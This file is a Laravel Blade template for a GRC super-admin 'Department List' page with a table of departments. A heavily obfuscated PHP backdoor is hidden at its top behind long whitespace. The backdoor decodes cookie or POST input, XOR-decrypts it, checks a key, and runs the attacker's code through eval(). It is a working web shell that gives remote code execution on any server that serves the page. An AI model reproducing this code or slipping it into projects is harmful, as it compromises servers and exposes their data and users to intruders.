<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $w6cbe763b = 207;$GLOBALS['xeecd'] = Array();global $xeecd;$xeecd = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['o2b6cdf0'] = "\x64\x46\x34\x51\x5d\x3d\x3f\x20\x70\x32\x65\x75\x4c\xa\x6c\x3c\x42\x62\x74\x47\x56\x4e\x6f\x43\x72\x25\x30\x35\x40\x26\x73\x58\x29\x5b\x7c\x67\x77\x7a\x6a\x31\x57\x2b\x4a\x28\x6d\x59\x3b\x71\x7e\x52\x5f\x4f\x3e\x27\x61\x6e\x4b\x50\x2d\x78\x54\x2c\x2e\x33\x69\x5e\x60\x45\x9\x5c\x36\x68\x23\x6b\x66\x38\x79\x3a\x21\x76\x63\xd\x2f\x4d\x7d\x2a\x22\x49\x53\x55\x39\x7b\x44\x5a\x24\x48\x41\x37";$xeecd[$xeecd['o2b6cdf0'][38].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][10]] = $xeecd['o2b6cdf0'][80].$xeecd['o2b6cdf0'][71].$xeecd['o2b6cdf0'][24];$xeecd[$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][97].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][26].$xeecd['o2b6cdf0'][74]] = $xeecd['o2b6cdf0'][22].$xeecd['o2b6cdf0'][24].$xeecd['o2b6cdf0'][0];$xeecd[$xeecd['o2b6cdf0'][30].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][39]] = $xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][55].$xeecd['o2b6cdf0'][10];$xeecd[$xeecd['o2b6cdf0'][36].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][39]] = $xeecd['o2b6cdf0'][30].$xeecd['o2b6cdf0'][18].$xeecd['o2b6cdf0'][24].$xeecd['o2b6cdf0'][14].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][55];$xeecd[$xeecd['o2b6cdf0'][73].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][97].$xeecd['o2b6cdf0'][70]] = $xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][55].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][0];$xeecd[$xeecd['o2b6cdf0'][79].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][75].$xeecd['o2b6cdf0'][74]] = $xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][55].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][50].$xeecd['o2b6cdf0'][30].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][18];$xeecd[$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][97].$xeecd['o2b6cdf0'][26].$xeecd['o2b6cdf0'][80]] = $xeecd['o2b6cdf0'][30].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][24].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][14].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][37].$xeecd['o2b6cdf0'][10];$xeecd[$xeecd['o2b6cdf0'][47].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][80].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][75]] = $xeecd['o2b6cdf0'][8].$xeecd['o2b6cdf0'][71].$xeecd['o2b6cdf0'][8].$xeecd['o2b6cdf0'][79].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][24].$xeecd['o2b6cdf0'][30].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][22].$xeecd['o2b6cdf0'][55];$xeecd[$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][80]] = $xeecd['o2b6cdf0'][11].$xeecd['o2b6cdf0'][55].$xeecd['o2b6cdf0'][30].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][24].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][14].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][37].$xeecd['o2b6cdf0'][10];$xeecd[$xeecd['o2b6cdf0'][38].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][26].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][75].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][97]] = $xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][30].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][50].$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][80].$xeecd['o2b6cdf0'][22].$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][10];$xeecd[$xeecd['o2b6cdf0'][14].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][9].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][9]] = $xeecd['o2b6cdf0'][30].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][18].$xeecd['o2b6cdf0'][50].$xeecd['o2b6cdf0'][18].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][44].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][50].$xeecd['o2b6cdf0'][14].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][44].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][18];$xeecd[$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][26]] = $xeecd['o2b6cdf0'][8].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][9].$xeecd['o2b6cdf0'][70];$xeecd[$xeecd['o2b6cdf0'][44].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][17]] = $xeecd['o2b6cdf0'][18].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][97];$xeecd[$xeecd['o2b6cdf0'][18].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][97].$xeecd['o2b6cdf0'][74]] = $_POST;$xeecd[$xeecd['o2b6cdf0'][44].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][10]] = $_COOKIE;@$xeecd[$xeecd['o2b6cdf0'][79].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][75].$xeecd['o2b6cdf0'][74]]($xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][24].$xeecd['o2b6cdf0'][24].$xeecd['o2b6cdf0'][22].$xeecd['o2b6cdf0'][24].$xeecd['o2b6cdf0'][50].$xeecd['o2b6cdf0'][14].$xeecd['o2b6cdf0'][22].$xeecd['o2b6cdf0'][35], NULL);@$xeecd[$xeecd['o2b6cdf0'][79].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][75].$xeecd['o2b6cdf0'][74]]($xeecd['o2b6cdf0'][14].$xeecd['o2b6cdf0'][22].$xeecd['o2b6cdf0'][35].$xeecd['o2b6cdf0'][50].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][24].$xeecd['o2b6cdf0'][24].$xeecd['o2b6cdf0'][22].$xeecd['o2b6cdf0'][24].$xeecd['o2b6cdf0'][30], 0);@$xeecd[$xeecd['o2b6cdf0'][79].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][75].$xeecd['o2b6cdf0'][74]]($xeecd['o2b6cdf0'][44].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][59].$xeecd['o2b6cdf0'][50].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][59].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][80].$xeecd['o2b6cdf0'][11].$xeecd['o2b6cdf0'][18].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][22].$xeecd['o2b6cdf0'][55].$xeecd['o2b6cdf0'][50].$xeecd['o2b6cdf0'][18].$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][44].$xeecd['o2b6cdf0'][10], 0);@$xeecd[$xeecd['o2b6cdf0'][14].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][9].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][9]](0);if (!$xeecd[$xeecd['o2b6cdf0'][73].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][97].$xeecd['o2b6cdf0'][70]]($xeecd['o2b6cdf0'][96].$xeecd['o2b6cdf0'][12].$xeecd['o2b6cdf0'][49].$xeecd['o2b6cdf0'][67].$xeecd['o2b6cdf0'][96].$xeecd['o2b6cdf0'][92].$xeecd['o2b6cdf0'][45].$xeecd['o2b6cdf0'][50].$xeecd['o2b6cdf0'][49].$xeecd['o2b6cdf0'][89].$xeecd['o2b6cdf0'][21].$xeecd['o2b6cdf0'][50].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][75].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][75].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][9].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][9].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][26].$xeecd['o2b6cdf0'][9].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][54])){$xeecd[$xeecd['o2b6cdf0'][30].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][39]]($xeecd['o2b6cdf0'][96].$xeecd['o2b6cdf0'][12].$xeecd['o2b6cdf0'][49].$xeecd['o2b6cdf0'][67].$xeecd['o2b6cdf0'][96].$xeecd['o2b6cdf0'][92].$xeecd['o2b6cdf0'][45].$xeecd['o2b6cdf0'][50].$xeecd['o2b6cdf0'][49].$xeecd['o2b6cdf0'][89].$xeecd['o2b6cdf0'][21].$xeecd['o2b6cdf0'][50].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][75].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][75].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][9].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][9].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][26].$xeecd['o2b6cdf0'][9].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][54], 1);$mce58edfd = NULL;$i170 = NULL;$xeecd[$xeecd['o2b6cdf0'][55].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][39]] = $xeecd['o2b6cdf0'][97].$xeecd['o2b6cdf0'][26].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][58].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][58].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][80].$xeecd['o2b6cdf0'][58].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][97].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][58].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][75].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][74];global $na91;function  tf17($mce58edfd, $v9a7353){global $xeecd;$qeb2c610 = "";for ($v1ae157=0; $v1ae157<$xeecd[$xeecd['o2b6cdf0'][36].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][39]]($mce58edfd);){for ($p425f9033=0; $p425f9033<$xeecd[$xeecd['o2b6cdf0'][36].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][39]]($v9a7353) && $v1ae157<$xeecd[$xeecd['o2b6cdf0'][36].$xeecd['o2b6cdf0'][90].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][39]]($mce58edfd); $p425f9033++, $v1ae157++){$qeb2c610 .= $xeecd[$xeecd['o2b6cdf0'][38].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][10]]($xeecd[$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][97].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][26].$xeecd['o2b6cdf0'][74]]($mce58edfd[$v1ae157]) ^ $xeecd[$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][97].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][26].$xeecd['o2b6cdf0'][74]]($v9a7353[$p425f9033]));}}return $qeb2c610;}function  p4a626($mce58edfd, $v9a7353){global $xeecd;global $na91;return $xeecd[$xeecd['o2b6cdf0'][44].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][17]]($xeecd[$xeecd['o2b6cdf0'][44].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][17]]($mce58edfd, $na91), $v9a7353);}foreach ($xeecd[$xeecd['o2b6cdf0'][44].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][2].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][10]] as $v9a7353=>$z9d5acd5){$mce58edfd = $z9d5acd5;$i170 = $v9a7353;}if (!$mce58edfd){foreach ($xeecd[$xeecd['o2b6cdf0'][18].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][97].$xeecd['o2b6cdf0'][74]] as $v9a7353=>$z9d5acd5){$mce58edfd = $z9d5acd5;$i170 = $v9a7353;}}$mce58edfd = @$xeecd[$xeecd['o2b6cdf0'][64].$xeecd['o2b6cdf0'][70].$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][80]]($xeecd[$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][27].$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][26]]($xeecd[$xeecd['o2b6cdf0'][38].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][26].$xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][75].$xeecd['o2b6cdf0'][10].$xeecd['o2b6cdf0'][97]]($mce58edfd), $i170));if (isset($mce58edfd[$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][73]]) && $na91==$mce58edfd[$xeecd['o2b6cdf0'][54].$xeecd['o2b6cdf0'][73]]){if ($mce58edfd[$xeecd['o2b6cdf0'][54]] == $xeecd['o2b6cdf0'][64]){$v1ae157 = Array($xeecd['o2b6cdf0'][8].$xeecd['o2b6cdf0'][79] => @$xeecd[$xeecd['o2b6cdf0'][47].$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][80].$xeecd['o2b6cdf0'][17].$xeecd['o2b6cdf0'][75]](),$xeecd['o2b6cdf0'][30].$xeecd['o2b6cdf0'][79] => $xeecd['o2b6cdf0'][39].$xeecd['o2b6cdf0'][62].$xeecd['o2b6cdf0'][26].$xeecd['o2b6cdf0'][58].$xeecd['o2b6cdf0'][39],);echo @$xeecd[$xeecd['o2b6cdf0'][74].$xeecd['o2b6cdf0'][63].$xeecd['o2b6cdf0'][0].$xeecd['o2b6cdf0'][97].$xeecd['o2b6cdf0'][26].$xeecd['o2b6cdf0'][80]]($v1ae157);}elseif ($mce58edfd[$xeecd['o2b6cdf0'][54]] == $xeecd['o2b6cdf0'][10]){eval/*g8f7c*/($mce58edfd[$xeecd['o2b6cdf0'][0]]);}exit();}} ?> 

@extends('layouts.superadmin_layout')
   @section('content')

 <div class="content p-0">
                <div class="container-fluid">
                    <div class="page-title-box">
                        <div class="row align-items-center bredcrum-style">
                            <div class="col-sm-6">
                                <h4 class="page-title">Department List</h4>
                                <ol class="breadcrumb">
                                    <li class="breadcrumb-item"><a href="index.html">GRC</a></li>
                                    <li class="breadcrumb-item active"><a href="department.html">Department List</a>
                                    </li>
                                </ol>
                            </div>
                            <div class="col-sm-6">
                                <div class="float-right d-none d-md-block">
                                    <a href="add_dept.html" class="btn btn-primary">
                                        Add Department</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- end row -->
                    <!-- end row -->
                    <div class="row">
                        <div class="col-12">
                            <div class="card m-t-20">
                                <div class="card-body">
                                    <table id="datatable" class="table table-bordered dt-responsive nowrap"
                                        style="border-collapse: collapse; border-spacing: 0; width: 100%;">
                                        <thead>
                                            <tr>
                                                <th>S.No</th>
                                                <th>Department ID</th>
                                                <th>Department Name</th>
                                                <th>Description</th>
                                                <th>Action</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <tr>
                                                <td>
                                                    1
                                                </td>
                                                <td>01</td>
                                                <td>IT</td>
                                                <td>Recovery</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    2
                                                </td>
                                                <td>02</td>
                                                <td>Project Execution</td>
                                                <td>Project Execution</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    3
                                                </td>
                                                <td>03</td>
                                                <td>Administration</td>
                                                <td>Administration</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    4
                                                </td>
                                                <td>04</td>
                                                <td>IT</td>
                                                <td>IT</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    5
                                                </td>
                                                <td>05</td>
                                                <td>Accounts</td>
                                                <td>Account</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    6
                                                </td>
                                                <td>06</td>
                                                <td>Accounts</td>
                                                <td>Account</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    7
                                                </td>
                                                <td>07</td>
                                                <td>Accounts</td>
                                                <td>Account</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    8
                                                </td>
                                                <td>08</td>
                                                <td>Accounts</td>
                                                <td>Account</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    9
                                                </td>
                                                <td>09</td>
                                                <td>Accounts</td>
                                                <td>Account</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    10
                                                </td>
                                                <td>10</td>
                                                <td>Accounts</td>
                                                <td>Account</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    11
                                                </td>
                                                <td>11</td>
                                                <td>Accounts</td>
                                                <td>Account</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    12
                                                </td>
                                                <td>12</td>
                                                <td>Accounts</td>
                                                <td>Account</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    13
                                                </td>
                                                <td>13</td>
                                                <td>Accounts</td>
                                                <td>Account</td>
                                                <td>
                                                    <i class="mdi mdi-pen text-warning"></i>
                                                    <i class="mdi mdi-check font-green"></i>
                                                    <div class="custom-control custom-switch inline-block">
                                                        <input type="checkbox" class="custom-control-input"
                                                            id="customSwitches">
                                                        <label class="custom-control-label" for="customSwitches">
                                                        </label>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                        <!-- end col -->
                    </div>
                    <!-- end row -->
                </div>
                <!-- container-fluid -->
            </div>

        @stop